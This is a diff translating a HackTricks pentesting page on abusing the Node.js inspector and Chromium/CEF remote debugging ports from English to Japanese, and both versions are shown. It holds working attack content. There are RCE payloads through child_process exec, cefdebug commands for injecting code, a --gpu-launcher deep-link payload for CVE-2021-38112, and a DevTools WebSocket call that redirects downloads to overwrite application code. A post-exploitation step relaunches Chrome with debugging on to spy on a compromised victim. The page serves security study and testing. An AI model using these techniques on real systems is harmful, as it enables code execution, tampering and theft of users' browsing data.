@@ -1,33 +1,32 @@
-# Node inspector/CEF debug abuse
+# Node inspector/CEFデバッグの乱用
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+- **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
 
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
 
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
 
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
 
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
 
 </details>
 
-## Basic Information
+## 基本情報
 
-When started with the `--inspect` switch, a Node.js process listens for a debugging client. By **default**, it will listen at host and port **`127.0.0.1:9229`**. Each process is also assigned a **unique** **UUID**.
+`--inspect`スイッチで起動すると、Node.jsプロセスはデバッグクライアントを待ち受けます。**デフォルトでは**、ホストとポート**`127.0.0.1:9229`**で待ち受けます。各プロセスにはまた、**一意のUUID**が割り当てられます。
 
-Inspector clients must know and specify host address, port, and UUID to connect. A full URL will look something like `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.
+インスペクタクライアントは、接続するためにホストアドレス、ポート、およびUUIDを知って指定する必要があります。完全なURLは、`ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`のようになります。
 
 {% hint style="warning" %}
-Since the **debugger has full access to the Node.js execution environment**, a malicious actor able to connect to this port may be able to execute arbitrary code on behalf of the Node.js process (**potential privilege escalation**).
+**デバッガはNode.jsの実行環境に完全なアクセス権を持っているため**、このポートに接続できる悪意のあるアクターは、Node.jsプロセスの代わりに任意のコードを実行する可能性があります（**潜在的な特権エスカレーション**）。
 {% endhint %}
 
-There are several ways to start an inspector:
-
+インスペクタを起動する方法はいくつかあります：
 ```bash
 node --inspect app.js #Will run the inspector in port 9229
 node --inspect=4444 app.js #Will run the inspector in port 4444
@@ -38,60 +37,50 @@ node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and po
 node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
 # Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
 ```
-
-When you start an inspected process something like this will appear:
-
+監査されたプロセスを開始すると、次のようなものが表示されます：
 ```
 Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
 For help, see: https://nodejs.org/en/docs/inspector
 ```
+**CEF**（**Chromium Embedded Framework**）をベースとしたプロセスは、デバッガ（SSRF保護はほぼ同じまま）を開くために`--remote-debugging-port=9222`というパラメータを使用する必要があります。ただし、これは**NodeJS**のデバッグセッションを許可する代わりに、[**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)を使用してブラウザと通信します。これはブラウザを制御するためのインターフェースですが、直接的なRCEはありません。
 
-Processes based on **CEF** (**Chromium Embedded Framework**) like need to use the param: `--remote-debugging-port=9222` to open de **debugger** (the SSRF protections remain very similar). However, they **instead** of granting a **NodeJS** **debug** session will communicate with the browser using the [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), this is an interface to control the browser, but there isn't a direct RCE.
-
-When you start a debugged browser something like this will appear:
-
+デバッグされたブラウザを起動すると、次のようなものが表示されます：
 ```
 DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
 ```
+### ブラウザ、WebSockets、および同一生成元ポリシー <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>
 
-### Browsers, WebSockets and same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>
-
-Websites open in a web-browser can make WebSocket and HTTP requests under the browser security model. An **initial HTTP connection** is necessary to **obtain a unique debugger session id**. The **same-origin-policy** **prevents** websites from being able to make **this HTTP connection**. For additional security against [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS\_rebinding)**,** Node.js verifies that the **'Host' headers** for the connection either specify an **IP address** or **`localhost`** or **`localhost6`** precisely.
+ウェブブラウザで開かれるウェブサイトは、ブラウザのセキュリティモデルの下でWebSocketとHTTPリクエストを行うことができます。**一意のデバッガーセッションIDを取得するためには、最初にHTTP接続が必要**です。**同一生成元ポリシー**により、ウェブサイトは**このHTTP接続を行うことができません**。[**DNSリバインディング攻撃**](https://en.wikipedia.org/wiki/DNS\_rebinding)****に対する追加のセキュリティ対策として、Node.jsは接続のための**'Host'ヘッダー**が**IPアドレス**または**`localhost`**または**`localhost6`**を正確に指定していることを検証します。
 
 {% hint style="info" %}
-This **security measures prevents exploiting the inspector** to run code by **just sending a HTTP request** (which could be done exploiting a SSRF vuln).
+この**セキュリティ対策により、インスペクターを悪用して単にHTTPリクエストを送信する**ことによるコードの実行が防止されます（これはSSRF脆弱性を悪用して行うことができます）。
 {% endhint %}
 
-### Starting inspector in running processes
+### 実行中のプロセスでインスペクターを開始する
 
-You can send the **signal SIGUSR1** to a running nodejs process to make it **start the inspector** in the default port. However, note that you need to have enough privileges, so this might grant you **privileged access to information inside the process** but no a direct privilege escalation.
-
+実行中のNode.jsプロセスに**シグナルSIGUSR1**を送信すると、デフォルトのポートで**インスペクターを開始**することができます。ただし、注意点として、十分な特権が必要なため、これにより**プロセス内の情報への特権アクセス**が付与される可能性がありますが、直接的な特権昇格は行われません。
 ```bash
 kill -s SIGUSR1 <nodejs-ps>
 # After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
 ```
-
 {% hint style="info" %}
-This is useful in containers because **shutting down the process and starting a new one** with `--inspect` is **not an option** because the **container** will be **killed** with the process.
+これはコンテナ内で役立ちます。`--inspect`を使用してプロセスをシャットダウンして新しいプロセスを開始することはできません。なぜなら、プロセスとともにコンテナが終了してしまうからです。
 {% endhint %}
 
-### Connect to inspector/debugger
+### インスペクタ/デバッガへの接続
 
-If you have access to a **Chromium base browser** you can connect accessing `chrome://inspect` or `edge://inspect` in Edge. Click the Configure button and ensure your **target host and port** are listed (Find an example in the following image of how to get RCE using one of the next sections examples).
+もし、**Chromiumベースのブラウザ**にアクセスできる場合、`chrome://inspect`または`edge://inspect`にアクセスして接続することができます。Configureボタンをクリックし、**ターゲットのホストとポート**がリストされていることを確認してください（次のイメージに、次のセクションの例を使用してRCEを取得する方法の例があります）。
 
 ![](<../../.gitbook/assets/image (620) (1).png>)
 
-Using the **command line** you can connect to a debugger/inspector with:
-
+**コマンドライン**を使用して、デバッガ/インスペクタに接続することもできます。
 ```bash
 node inspect <ip>:<port>
 node inspect 127.0.0.1:9229
 # RCE example from debug console
 debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
 ```
-
-The tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), allows to **find inspectors** running locally and **inject code** into them.
-
+このツール[**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug)は、ローカルで実行中の**インスペクターを見つけ**、それらに**コードを注入**することができます。
 ```bash
 #List possible vulnerable sockets
 ./cefdebug.exe
@@ -100,76 +89,67 @@ The tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefd
 #Exploit it
 ./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
 ```
-
 {% hint style="info" %}
-Note that **NodeJS RCE exploits won't work** if connected to a browser via [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (you need to check the API to find interesting things to do with it).
+注意してください、**NodeJS RCE exploitsは**[**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)を介してブラウザに接続されている場合は機能しません（興味深いことをするためにAPIをチェックする必要があります）。
 {% endhint %}
 
-## RCE in NodeJS Debugger/Inspector
+## NodeJSデバッガー/インスペクターでのRCE
 
 {% hint style="info" %}
-If you came here looking how to get [**RCE from a XSS in Electron please check this page.**](../../network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps/)
+もしElectronのXSSからRCEを取得する方法を探してここに来た場合は、[**このページをチェックしてください。**](../../network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps/)
 {% endhint %}
 
-Some common ways to obtain **RCE** when you can **connect** to a Node **inspector** is using something like (looks that this **won't work in a connection to Chrome DevTools protocol**):
-
+Node **inspector**に**接続**できる場合、**RCE**を取得するための一般的な方法は次のようなものです（Chrome DevTools Protocolへの接続では機能しないようです）：
 ```javascript
 process.mainModule.require('child_process').exec('calc')
 window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
 require('child_process').spawnSync('calc.exe')
 Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
 ```
-
 ## Chrome DevTools Protocol Payloads
 
-You can check the API here: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
-In this section I will just list interesting things I find people have used to exploit this protocol.
+APIはこちらで確認できます：[https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
+このセクションでは、このプロトコルを悪用するために人々が使用した興味深い事例をリストアップします。
 
-### Parameter Injection via Deep Links
+### ディープリンクを介したパラメーターのインジェクション
 
-In the [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)  Rhino security discovered that an application based on CEF **registered a custom UR**I in the system (workspaces://) that received the full URI and then **launched the CEF based applicatio**n with a configuration that was partially constructing from that URI.
+[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)では、Rhino SecurityがCEFベースのアプリケーションがシステムにカスタムURI（workspaces://）を登録し、そのURIを受け取り、そのURIから一部構築された設定でCEFベースのアプリケーションを起動していることを発見しました。
 
-It was discovered that the URI parameters where URL decoded and used to launch the CEF basic application, allowing a user to **inject** the flag **`--gpu-launcher`** in the **command line** and execute arbitrary things.
+URIのパラメーターがURLデコードされ、CEFベースのアプリケーションの起動に使用されることがわかりました。これにより、ユーザーはコマンドラインにフラグ**`--gpu-launcher`**を**インジェクト**し、任意の操作を実行することができます。
 
-So, a payload like:
-
+したがって、以下のようなペイロードを使用することができます：
 ```
 workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
 ```
+calc.exeを実行します。
 
-Will execute a calc.exe.
+### ファイルの上書き
 
-### Overwrite Files
-
-Change the folder where **downloaded files are going to be saved** and download a file to **overwrite** frequently used **source code** of the application with your **malicious code**.
-
+**ダウンロードされたファイルが保存されるフォルダ**を変更し、**悪意のあるコード**で**アプリケーションの頻繁に使用されるソースコード**を上書きするためにファイルをダウンロードします。
 ```javascript
 ws = new WebSocket(url); //URL of the chrome devtools service
 ws.send(JSON.stringify({
-    id: 42069,
-    method: 'Browser.setDownloadBehavior',
-    params: {
-        behavior: 'allow',
-        downloadPath: '/code/'
-    }
+id: 42069,
+method: 'Browser.setDownloadBehavior',
+params: {
+behavior: 'allow',
+downloadPath: '/code/'
+}
 }));
 ```
+### Webdriver RCEと情報の外部流出
 
-### Webdriver RCE and exfiltration
+この記事[https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)によると、theriverからRCEを取得し、内部ページを外部に流出させることが可能です。
 
-According to this post: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) it's possible to obtain RCE and exfiltrate internal pages from theriver.
+### ポストエクスプロイテーション
 
-### Post-Exploitation
+実際の環境で、ユーザーのPCを侵害した後、Chrome/Chromiumベースのブラウザを使用してChromeプロセスを起動し、デバッグを有効化し、デバッグポートをポートフォワードすることができます。これにより、被害者がChromeで行うすべての操作を検査し、機密情報を盗むことができます。
 
-In a real environment and **after compromising** a user PC that uses Chrome/Chromium based browser you could launch a Chrome process with the **debugging activated and port-forward the debugging port** so you can access it. This way you will be able to **inspect everything the victim does with Chrome and steal sensitive information**.
-
-The stealth way is to **terminate every Chrome process** and then call something like
-
+ステルスの方法は、すべてのChromeプロセスを終了し、次のような呼び出しを行うことです。
 ```bash
 Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
 ```
-
-## References
+## 参考文献
 
 * [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
 * [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
@@ -186,14 +166,14 @@ Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+- **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
 
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
 
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
 
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+- **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+- **ハッキングのトリックを共有するには、[hacktricks repo](https://github.com/carlospolop/hacktricks)と[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
 
 </details>
